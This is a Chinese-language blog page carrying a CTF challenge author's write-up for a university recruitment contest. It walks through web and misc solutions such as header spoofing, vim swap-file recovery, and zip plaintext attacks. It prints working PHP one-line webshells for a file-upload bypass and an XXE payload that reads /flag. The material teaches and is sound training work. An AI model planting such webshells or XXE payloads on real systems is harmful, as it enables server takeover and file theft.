<!DOCTYPE html>
<html>
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  

  
  <title>Err0r</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="gugugu">
<meta property="og:type" content="website">
<meta property="og:title" content="Err0r">
<meta property="og:url" content="https://err0r.top/page/2/index.html">
<meta property="og:site_name" content="Err0r">
<meta property="og:description" content="gugugu">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="gyy">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Err0r</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://err0r.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-md5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/md5/" class="article-date">
  <time datetime="2020-12-09T05:55:00.000Z" itemprop="datePublished">2020-12-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/">杂谈笔记</a>►<a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/md5/">md5比较</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>MD5弱类型比较，强类型比较以及真实碰撞</p>
        
          <p class="article-more-link">
            <a href="/article/md5/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/md5/" data-id="cklc0zh1w003bfpovc6y7a2f7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-S3cCTF-出题人gyy-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/article/S3cCTF-gyy-Writeup/" class="article-date">
  <time datetime="2020-11-23T10:18:25.000Z" itemprop="datePublished">2020-11-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/article/S3cCTF-gyy-Writeup/">S3cCTF-出题人gyy-Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p>
<p><strong>写在前面：</strong></p>
<p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强= =，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p>
<h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1">

<hr>
<h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p>
<h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2">

<hr>
<h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p>
<pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Host: 127.0.0.1
Referer: 127.0.0.1</code></pre>

<h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3">

<hr>
<h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p>
<pre class="language-php" data-language="php"><code class="language-php">//flag.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php">//404.php
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- 才怪 --></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	@<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	@<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span></code></pre>

<h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404">
<p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag">
<p>拿去base64解一下即可获得flag</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64">
<hr>
<h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p>
<p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a target="_blank" rel="noopener" href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p>
<h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数">
<p>如果没有就会die退出</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>最后放出Payload，师傅们可以自己研究</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">"""
@Time ： 2020/11/22 18:14
@Auth ： gyy
@File ：1.py
@Blog：http://err0r.top

"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span>
<span class="token punctuation">&#125;</span>

response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>
cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>

result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>
data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> result

res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
</code></pre>

<img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum">
<p>本人蹩脚自学的python，语法规范问题请见谅</p>
<hr>
<h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p>
<p>给了hint：vim强退会在当前目录生成生成备份文件</p>
<h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim">
<p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z">
<p>而再vim编辑就会有如下提示</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re">
<p>直接Recover恢复即可。</p>
<p>根据提示，访问./.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1">
<p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p>
<pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre>

<img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2">
<p>机器人会告诉你剩下的，联想robots协议，访问./robots.txt</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots">
<p>可得flag在./r/o/b/o/a/t/s/1.php</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3">
<p>将三段flag组合即可</p>
<hr>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p>
<h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php">
<p>上传普通图片，被过滤</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif">
<p>抓包上传,原始如下</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1">
<p>修改如下</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2">


<p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload">
<p>然后访问文件</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2">
<p>发现代码被执行了，直接蚁剑连上get shell</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3">
<p>根目录发现flag</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4">


<p>你们真的传了一堆堆奇奇怪怪的图片。。。</p>
<hr>
<h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p>
<h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint">
<p>底部发现</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system">
<p>其实是执行了<code>system(&quot;ls&quot;);</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index">
<p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;</code></pre>

<img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom">
<p>其实还可以利用写入一句话木马等操作。</p>
<hr>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p>
<h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p>
<h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc">
<p>访问<code>https://www.ietf.org/</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc">
<p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc">
<p>截至2020年10月31日，一查</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc">
<p>最新为RFC8940<br>这种东西最标准还是去官网查</p>
<h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014">

<h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1">
<p>全景地图</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1">
<p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1"><br>good</p>
<h4 id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p>
<h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p>
<p>全部答对给flag，不行爆破也行</p>
<hr>
<h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p>
<h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id">
<p>打开去掉disable标签</p>
<img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id">
<p>下面提示</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id">
<p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id">

<hr>
<h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p>
<h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p>
<p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag">
<p>软件读文件</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag">
<p>拖出来打开就是flag</p>
<hr>
<h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p>
<h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
	fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span>
	<span class="token keyword">do</span>
	<span class="token punctuation">&#123;</span>
		a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span> </code></pre>

<p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p>
<img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man">

<hr>
<h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p>
<h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient">

<hr>
<h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p>
<h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p>
<pre class="language-none"><code class="language-none">亲眼所见，亦非真实
也许是虚伪的，也许需要AZPR
</code></pre>

<p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p>
<img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00">
<p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00">
<p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p>
<p>用AZPR选择明文攻击即可</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述">
<p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述">
<p>保存文件，其实已经破解出来了</p>
<img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述">
<p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://err0r.top/article/S3cCTF-gyy-Writeup/" data-id="cklc0zh1n000xfpov1vmh2bwo" class="article-share-link">Share</a>
      
